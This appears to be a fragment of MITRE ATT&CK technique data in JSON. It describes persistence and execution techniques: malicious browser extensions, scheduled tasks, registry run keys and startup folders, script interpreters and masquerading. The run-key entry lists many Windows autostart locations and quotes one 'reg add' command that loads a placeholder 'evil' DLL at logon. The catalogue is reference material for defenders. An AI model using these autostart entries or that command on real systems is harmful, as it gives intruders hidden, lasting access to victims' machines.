\"attack_pattern_identifier\": \"T1176\", \"description\": \"Adversaries may abuse Internet browser extensions to establish persistence access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)\\n\\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser (including credentials) (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence.\\n\\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control  (Citation: Chrome Extension C2 Malware).\", \"modified\": \"2020-03-25T23:36:30.565Z\", \"id\": \"attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8\"}, \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:46.977Z\", \"name\": \"Scheduled Task/Job\", \"attack_pattern_identifier\": \"T1053\", \"modified\": \"2020-10-14T15:20:01.069Z\", \"description\": \"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\\n\\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).\", \"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\"}, \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-23T22:02:48.566Z\", \"name\": \"Registry Run Keys / Startup Folder\", \"attack_pattern_identifier\": \"T1547.001\", \"description\": \"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \\\"run keys\\\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\\n\\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\\\Users\\\\[Username]\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup</code>. The startup folder path for all users is <code>C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp</code>.\\n\\nThe following run keys are created by default on Windows systems:\\n\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce</code>\\n\\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \\\"Depend\\\" key with RunOnceEx: <code>reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\\"C:\\\\temp\\\\evil[.]dll\\\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\\n\\nThe following Registry keys can be used to set startup folder items for persistence:\\n\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n\\nThe following Registry keys can control automatic startup of services during boot:\\n\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n\\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\\n\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n\\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell</code> subkeys can automatically launch programs.\\n\\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows</code> run when any user logs on.\\n\\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\\n\\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.\", \"modified\": \"2020-08-03T16:30:26.918Z\", \"id\": \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\"}, \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:49.546Z\", \"name\": \"Command and Scripting Interpreter\", \"attack_pattern_identifier\": \"T1059\", \"description\": \"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\\n\\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.\", \"modified\": \"2020-10-22T16:43:39.362Z\", \"id\": \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\"}, \"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:38.511Z\", \"name\": \"Masquerading\", \"attack_pattern_identifier\": \"T1036\", \"description\": \"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\\n\\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)\", \"modified\": \"2020-07-09T13:54:28.727Z\", \"id\": \"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\"}}}"